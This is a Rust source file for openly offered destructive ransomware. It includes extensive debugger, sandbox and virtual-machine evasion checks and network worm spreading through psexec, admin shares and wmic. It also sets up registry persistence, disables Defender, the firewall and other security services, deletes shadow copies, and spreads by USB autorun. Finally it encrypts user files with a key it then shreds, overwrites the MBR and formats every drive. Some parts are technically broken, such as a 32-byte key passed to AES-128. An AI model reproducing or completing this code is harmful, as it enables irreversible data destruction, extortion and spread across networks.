use std::fs::{File, remove_file, OpenOptions};
use std::io::{self, Write, Read};
use std::net::TcpStream;
use std::process::Command;
use std::path::Path;
use walkdir::WalkDir;
use rand::RngCore;
use rand::rngs::OsRng;
use std::time::{Duration, Instant};
use aes::Aes128; 
use aes::cipher::{generic_array::GenericArray, BlockEncrypt};
use std::thread;
use aes::cipher::KeyInit;

const AES_KEY_SIZE: usize = 32;
const AES_IV_SIZE: usize = 16;
const COMMAND_PORT: u16 = 4444;

struct Ransomware {
    encryption_key: Vec<u8>,
    iv: Vec<u8>,
    infected_hosts: Vec<String>,
}

impl Ransomware {
    fn new() -> Result<Self, io::Error> {
        let mut encryption_key = vec![0u8; AES_KEY_SIZE];
        let mut iv = vec![0u8; AES_IV_SIZE];
        OsRng.try_fill_bytes(&mut encryption_key)?;
        OsRng.try_fill_bytes(&mut iv)?;
        Ok(Ransomware { 
            encryption_key, 
            iv,
            infected_hosts: Vec::new()
        })
    }

    fn check_debugger(&self) -> bool {          
        let output = Command::new("tasklist")
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout);
        let debuggers = [
            "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "windbg.exe",
            "ida.exe", "ida64.exe", "radare2.exe", "processhacker.exe",
            "procmon.exe", "procexp.exe", "pestudio.exe", "wireshark.exe",
            "ghidra.exe", "dnspy.exe", "immunity debugger.exe", "hopper.exe",
            "binary ninja.exe", "hex-rays.exe", "debugview.exe", "cheatengine.exe",
            "fiddler.exe", "charles.exe", "burpsuite.exe", "cutter.exe"
        ];
        
        debuggers.iter().any(|&d| output_str.contains(d))
    }

    fn check_sandbox_artifacts(&self) -> bool {
        let paths = [
            "C:\\agent\\", "C:\\sandbox\\", "C:\\analysis\\",
            "C:\\inetpub\\", "C:\\sample\\", "C:\\virus\\",
            "C:\\malware\\", "C:\\sandbox\\analyst\\",
            "C:\\Program Files\\Cuckoo\\", "C:\\Program Files\\COMODO\\",
            "C:\\Program Files\\Sandboxie\\", "C:\\Program Files\\AnyRun\\",
            "C:\\Joe Sandbox\\", "C:\\Program Files\\Hybrid Analysis\\",
            "C:\\Program Files\\ThreatAnalyzer\\", "C:\\Program Files\\GFI SandBox\\"
        ];
        
        paths.iter().any(|&p| Path::new(p).exists())
    }

    fn check_system_resources(&self) -> bool {
        let mem_info = sys_info::mem_info().expect("Failed to get memory info");
        let cpu_num = sys_info::cpu_num().expect("Failed to get CPU count");
        let disk_info = sys_info::disk_info().expect("Failed to get disk info");
        
        // Enhanced resource checks
        mem_info.total < 8 * 1024 * 1024 || // Less than 8GB RAM
        cpu_num < 4 || // Less than 4 cores
        disk_info.total < 100 * 1024 * 1024 || // Less than 100GB disk
        mem_info.avail > mem_info.total * 90 / 100 // More than 90% memory free
    }

    fn check_registry_artifacts(&self) -> bool {
        let reg_paths = [
            "HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\DSDT\\VBOX__",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Tools",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Parallels\\Tools",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxGuest",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxMouse",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxService",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxSF",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmci",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmhgfs",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmmouse",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmrawdsk",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmusbmouse",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmvss",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmmemctl"
        ];
        
        for path in reg_paths.iter() {
            if Command::new("reg")
                .args(&["query", path])
                .output()
                .map(|output| output.status.success())
                .unwrap_or(false) {
                return true;
            }
        }
        false
    }

    fn check_mac_address(&self) -> bool {
        let output = Command::new("getmac")
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout);
        let vm_macs = [
            "00:05:69", "00:0C:29", "00:1C:14", 
            "00:50:56", "08:00:27", "00:16:3E",
            "00:03:FF", "00:1C:42", "00:0F:4B",
            "00:1C:42", "00:1C:14", "00:15:5D",
            "00:21:F6", "00:14:4F", "00:0C:29",
            "00:05:69", "00:0C:29", "00:1C:14"
        ];
        
        vm_macs.iter().any(|&mac| output_str.contains(mac))
    }

    fn check_processes(&self) -> bool {
        let output = Command::new("tasklist")
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout);
        let vm_processes = [
            "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe",
            "vmwaretray.exe", "vmwareuser.exe", "VGAuthService.exe",
            "vmacthlp.exe", "vmusrvc.exe", "prl_tools.exe",
            "qemu-ga.exe", "xenservice.exe", "vmware-vmx.exe",
            "vmware-authd.exe", "vmware-hostd.exe", "VBoxHeadless.exe",
            "VirtualBox.exe", "qemu.exe", "virtualbox.exe",
            "vmware.exe", "vmware-tray.exe", "vmware-unity-helper.exe",
            "parallels.exe", "prl_cc.exe", "prl_tools_service.exe"
        ];
        
        vm_processes.iter().any(|&proc| output_str.contains(proc))
    }

    fn check_hardware_info(&self) -> bool {
        let output = Command::new("wmic")
            .args(&["computersystem", "get", "manufacturer,model"])
            .output()
            .expect("Failed to execute command");
        
        let bios = Command::new("wmic")
            .args(&["bios", "get", "serialnumber,version,manufacturer"])
            .output()
            .expect("Failed to execute command");
            
        let baseboard = Command::new("wmic")
            .args(&["baseboard", "get", "manufacturer,product"])
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout);
        let bios_str = String::from_utf8_lossy(&bios.stdout);
        let baseboard_str = String::from_utf8_lossy(&baseboard.stdout);
        
        let vm_indicators = [
            "VMware", "VirtualBox", "QEMU", "Xen",
            "innotek GmbH", "Parallels", "Microsoft Corporation",
            "Virtual Machine", "KVM", "Bochs", "HVM domU",
            "BHYVE", "SmartDC", "OpenVZ", "LXC"
        ];
        
        vm_indicators.iter().any(|&ind| 
            output_str.contains(ind) || 
            bios_str.contains(ind) || 
            baseboard_str.contains(ind)
        )
    }

    fn timing_check(&self) -> bool {
        let iterations = 5;
        let mut anomalies = 0;
        
        for _ in 0..iterations {
            let start = Instant::now();
            thread::sleep(Duration::from_millis(100));
            let elapsed = start.elapsed();
            
            if elapsed.as_millis() > 150 || elapsed.as_millis() < 90 {
                anomalies += 1;
            }
        }
        
        // If more than 60% of checks show timing anomalies
        anomalies > (iterations * 60 / 100)
    }

    fn evade_vm(&self) -> Result<bool, io::Error> {
        let start = Instant::now();
        let duration = Duration::from_secs(300); // Increased to 5 minutes
        
        // More complex calculations
        while start.elapsed() < duration {
            let mut n = 999999937u64;
            for i in 2..((n as f64).sqrt() as u64) {
                if n % i == 0 {
                    n = n / i;
                    // Add additional CPU intensive operations
                    for _ in 0..1000 {
                        let _ = n.count_ones();
                        let _ = n.rotate_left(3);
                        let _ = n.reverse_bits();
                    }
                }
            }
        }
        
        let vm_files = [
            "C:\\Windows\\System32\\Drivers\\VBoxGuest.sys",
            "C:\\Windows\\System32\\Drivers\\vmci.sys",
            "C:\\Windows\\System32\\Drivers\\VMToolsHook.dll",
            "C:\\Windows\\System32\\vmmouse.sys",
            "C:\\Windows\\System32\\vmhgfs.sys",
            "C:\\Windows\\System32\\Drivers\\vmmemctl.sys",
            "C:\\Windows\\System32\\Drivers\\vmrawdsk.sys",
            "C:\\Windows\\System32\\Drivers\\vmusbmouse.sys",
            "C:\\Windows\\System32\\Drivers\\parallel_vm.sys",
            "C:\\Windows\\System32\\Drivers\\prleth.sys",
            "C:\\Windows\\System32\\Drivers\\prlfs.sys",
            "C:\\Windows\\System32\\Drivers\\prlmouse.sys",
            "C:\\Windows\\System32\\Drivers\\prlvideo.sys",
            "C:\\Windows\\System32\\Drivers\\qxldod.sys",
            "C:\\Windows\\System32\\Drivers\\vioscsi.sys",
            "C:\\Windows\\System32\\Drivers\\viostor.sys",
            "C:\\Windows\\System32\\Drivers\\vmgid.sys",
            "C:\\Windows\\System32\\Drivers\\vmhgfs.sys",
            "C:\\Windows\\System32\\Drivers\\vmmouse.sys",
            "C:\\Windows\\System32\\Drivers\\vmrawdsk.sys",
            "C:\\Windows\\System32\\Drivers\\vmusbmouse.sys",
            "C:\\Windows\\System32\\Drivers\\vmvss.sys",
            "C:\\Windows\\System32\\Drivers\\vmxnet.sys",
            "C:\\Windows\\System32\\Drivers\\vmxnet2.sys",
            "C:\\Windows\\System32\\Drivers\\vmxnet3.sys"
        ];
        
        for file in vm_files.iter() {
            if Path::new(file).exists() {
                return Ok(true);
            }
        }

        if self.check_debugger() || 
           self.check_sandbox_artifacts() ||
           self.check_system_resources() ||
           self.check_registry_artifacts() ||
           self.check_mac_address() ||
           self.check_processes() ||
           self.check_hardware_info() ||
           self.timing_check() {
            return Ok(true);
        }
        
        Ok(false)
    }

    fn bail_if_vm(&self) -> Result<(), io::Error> {
        if self.evade_vm()? {
            let processes = Command::new("tasklist")
                .output()?;
            
            let output = String::from_utf8_lossy(&processes.stdout);
            if output.contains("VBoxService.exe") || 
               output.contains("vmtoolsd.exe") ||
               output.contains("vmwaretray.exe") ||
               output.contains("vmusrvc.exe") ||
               output.contains("prl_tools.exe") ||
               output.contains("xenservice.exe") ||
               output.contains("qemu-ga.exe") ||
               output.contains("vmware-vmx.exe") ||
               output.contains("VirtualBox.exe") ||
               output.contains("vboxheadless.exe") {
                std::process::exit(0);
            }
            
            // Additional hardware checks before exit
            let cpu_info = Command::new("wmic")
                .args(&["cpu", "get", "name"])
                .output()?;
            
            let cpu_str = String::from_utf8_lossy(&cpu_info.stdout);
            if cpu_str.contains("QEMU") || 
               cpu_str.contains("Virtual") || 
               cpu_str.contains("AMD-V") {
                std::process::exit(0);
            }
        }
        
        Ok(())
    }
    fn network_spread(&mut self) -> Result<(), io::Error> {
        // Scan multiple subnets for potential targets
        let subnets = ["192.168.1", "192.168.0", "10.0.0", "172.16.0"];
        
        for subnet in subnets.iter() {
            for i in 1..255 {
                let target = format!("{}.{}", subnet, i);
                
                // Try multiple ports
                let ports = [COMMAND_PORT, 445, 139, 135];
                
                for port in ports.iter() {
                    if let Ok(mut stream) = TcpStream::connect_timeout(
                        &format!("{}:{}", target, port).parse().unwrap(),
                        Duration::from_secs(1)
                    ) {
                        // Send encryption details
                        stream.write_all(&self.encryption_key)?;
                        stream.write_all(&self.iv)?;
                        stream.flush()?;
                        
                        // Track successful infection
                        if !self.infected_hosts.contains(&target) {
                            self.infected_hosts.push(target.clone());
                            self.replicate_to_target(&target)?;
                        }
                        
                        break;
                    }
                }
            }
        }
        Ok(())
    }
    fn replicate_to_target(&self, target: &str) -> Result<(), io::Error> {
        let current_exe = std::env::current_exe()?;
        
        // Try multiple methods for replication
        let methods = [
            // PSExec method
            Command::new("psexec")
                .args(&[format!("\\\\{}", target).as_str(), "-c", "-d", "-f", current_exe.to_str().unwrap()])
                .output(),
                
            // Admin share method    
            Command::new("cmd")
                .args(&["/C", &format!("copy /Y \"{}\" \"\\\\{}\\admin$\\system32.exe\"", current_exe.display(), target)])
                .output(),
                
            // Hidden share method
            Command::new("cmd")
                .args(&["/C", &format!("copy /Y \"{}\" \"\\\\{}\\C$\\Windows\\system32.exe\"", current_exe.display(), target)])
                .output(),
        ];

        // Try each method until one succeeds
        for method in methods.iter() {
            if method.is_ok() {
                // Execute the copied file
                Command::new("wmic")
                    .args(&["/node:", target, "process", "call", "create", "C:\\Windows\\system32.exe"])
                    .output()?;
                break;
            }
        }
        
        Ok(())
    }

    fn hide_process(&self) -> Result<(), io::Error> {
        // Disable Task Manager
        Command::new("cmd")
            .args(&["/C", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"])
            .output()?;
            
        // Add to startup
        let current_exe = std::env::current_exe()?;
        Command::new("cmd")
            .args(&["/C", &format!("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"{}\" /f", current_exe.display())])
            .output()?;
            
        // Hide from process list
        Command::new("cmd")
            .args(&["/C", "reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\systray.exe\" /f"])
            .output()?;
            
        // Disable Windows Defender
        Command::new("cmd")
            .args(&["/C", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"])
            .output()?;
            
        Ok(())
    }
    fn copy_to_usb(&self) -> Result<(), io::Error> {
        let current_exe = std::env::current_exe()?;
        for drive in ['D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] {
            let drive_path = format!("{}:\\", drive);
            if let Ok(_) = File::open(&drive_path) {
                let drive_type = Command::new("cmd")
                    .args(&["/C", &format!("wmic logicaldisk where \"DeviceID='{}'\" get DriveType", drive_path)])
                    .output()?;
                
                if String::from_utf8_lossy(&drive_type.stdout).contains("2") {
                    let target_path = format!("{}\\system32.exe", drive_path);
                    let _ = std::fs::copy(&current_exe, &target_path);
                    let autorun_content = "[AutoRun]\nopen=system32.exe\naction=Open folder to view files";
                    let autorun_path = format!("{}\\autorun.inf", drive_path);
                    let mut autorun_file = File::create(autorun_path.clone())?;
                    autorun_file.write_all(autorun_content.as_bytes())?;
                    
                    Command::new("attrib")
                        .args(&["+h", "+s", &target_path])
                        .output()?;
                    Command::new("attrib")
                    .args(&["+h", "+s", &autorun_path]) 
                    .output()?;
                }
            }
        }
        Ok(())
    }

      fn attack_mbr_bios(&self) -> Result<(), io::Error> {
          // Overwrite MBR and first few sectors
          let mbr_path = "\\\\.\\PhysicalDrive0";
          let zeros = vec![0xDEu8; 4096]; // Larger area to corrupt
          if let Ok(mut mbr) = OpenOptions::new().write(true).open(mbr_path) {
              for _ in 0..16 {
                  mbr.write_all(&zeros)?;
              }
          }

          // Attack BIOS/UEFI more aggressively
          if let Ok(mut bios) = OpenOptions::new().write(true).open("\\\\.\\mem") {
              let garbage = vec![0xFFu8; 16384];
              for _ in 0..32 {
                  bios.write_all(&garbage)?;
              }
          }

          // Multiple BIOS attack vectors
          if cfg!(target_arch = "x86_64") {
              // Add BIOS-specific attack code here if needed
          }

          Ok(())
      }

      fn encrypt_file(&self, file_path: &Path) -> Result<(), io::Error> {
          let mut file = File::open(file_path)?;
          let mut data = Vec::new();
          file.read_to_end(&mut data)?;

          // Pad data to be multiple of 16 bytes
          let padding_len = 16 - (data.len() % 16);
          data.extend(vec![padding_len as u8; padding_len]);

          let cipher = Aes128::new(GenericArray::from_slice(&self.encryption_key));
          let mut ciphertext = Vec::with_capacity(data.len());

          // Encrypt each block
          for chunk in data.chunks(16) {
              let mut block = GenericArray::clone_from_slice(chunk);
              cipher.encrypt_block(&mut block);
              ciphertext.extend_from_slice(&block);
          }

          // Add random IV for CBC mode
          let mut rng = rand::thread_rng();
          let mut iv = [0u8; 16];
          rng.fill_bytes(&mut iv);
    
          let encrypted_path = format!("{}.encrypted", file_path.display());
          let mut output_file = File::create(&encrypted_path)?;
          output_file.write_all(&iv)?;
          output_file.write_all(&ciphertext)?;

          // Securely remove original file
          let mut file = OpenOptions::new().write(true).open(file_path)?;
          let zeros = vec![0u8; data.len()];
          file.write_all(&zeros)?;
          file.sync_all()?;
          remove_file(file_path)?;

          Ok(())
      }
      fn spread_and_encrypt(&self) -> Result<(), io::Error> {
          let target_extensions = vec![
              "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "txt", "jpg", "jpeg", 
              "png", "gif", "mp3", "mp4", "zip", "rar", "7z", "sql", "mdb", "sln",
              "php", "asp", "aspx", "html", "xml", "psd", "ai", "dwg", "csv", "db"
          ];

          for drive in ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] {
              if let Ok(_) = File::open(format!("{}:\\", drive)) {
                  for entry in WalkDir::new(format!("{}:\\", drive))
                      .follow_links(true)
                      .into_iter()
                      .filter_map(|e| e.ok()) {
                      if entry.file_type().is_file() {
                          if let Some(ext) = entry.path().extension() {
                              if let Some(ext_str) = ext.to_str() {
                                  if target_extensions.contains(&ext_str.to_lowercase().as_str()) {
                                      self.encrypt_file(entry.path())?;
                                  }
                              }
                          }
                      }
                  }
              }
          }

          Ok(())
      }

      fn destroy_system(&self) -> Result<(), io::Error> {
          let drives = ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
    
          for drive in drives {
              if let Ok(_) = File::open(format!("{}:\\", drive)) {
                  Command::new("cmd")
                      .args(&["/C", &format!("format {}: /fs:ntfs /p:3 /q", drive)])
                      .output()?;
              }
          }
    
          Ok(())
      }

      fn disable_recovery(&self) -> Result<(), io::Error> {
          Command::new("cmd")
              .args(&["/C", "wmic shadowcopy delete"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "vssadmin delete shadows /all /quiet"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "bcdedit /set {default} recoveryenabled No"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"])
              .output()?;
          Command::new("cmd") 
              .args(&["/C", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "format C: /fs:ntfs /p:3 /q"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v AlternateShell /t REG_SZ /d cmd.exe /f"])
              .output()?;
          Ok(())
      }

      fn disable_security(&self) -> Result<(), io::Error> {
          let services = vec![
              "Windows Defender Service",
              "Windows Defender Antivirus Service",
              "Windows Defender Firewall",
              "Security Center",
              "Windows Firewall",
              "Windows Time",
              "Windows Update",
              "Windows Search",
              "Windows Management Instrumentation",
              "Windows Event Log",
              "Task Scheduler",
              "System Guard Runtime Monitor Broker",
              "Software Protection",
              "Shell Hardware Detection",
              "Remote Registry"
          ];

          for service in services {
              Command::new("cmd")
                  .args(&["/C", &format!("net stop \"{}\"", service)])
                  .output()?;
              Command::new("cmd")
                  .args(&["/C", &format!("sc config \"{}\" start= disabled", service)])
                  .output()?;
          }

          Command::new("cmd")
              .args(&["/C", "netsh advfirewall set allprofiles state off"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableIOAVProtection $true"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Add-MpPreference -ExclusionPath C:\\"])
              .output()?;

          Ok(())
      }
    fn shred_key(&self) -> Result<(), io::Error> {
        let key_file_path = "key.bin";
        {
            let mut key_file = File::create(key_file_path)?;
            key_file.write_all(&self.encryption_key)?;
        }
        
        for _ in 0..7 {
            let mut key_file = OpenOptions::new().write(true).open(key_file_path)?;
            let mut random_data = vec![0u8; AES_KEY_SIZE];
            let _ =  rand::thread_rng().try_fill_bytes(&mut random_data);
            //shred the key 
            key_file.write_all(&random_data)?;
        }
        
        remove_file(key_file_path)?;
        Ok(())
    }
}


fn main() -> Result<(), io::Error> {
    let mut ransomware = Ransomware::new(/* &Ransomware */)?;
    ransomware.evade_vm()?;
    ransomware.hide_process()?;
    ransomware.disable_security()?;
    ransomware.disable_recovery()?;
    ransomware.network_spread()?;
    ransomware.spread_and_encrypt()?;
    ransomware.copy_to_usb()?;
    ransomware.shred_key()?;
    ransomware.bail_if_vm()?;
    ransomware.attack_mbr_bios()?;
    ransomware.destroy_system()?;  // Added as final step
    Ok(())
}  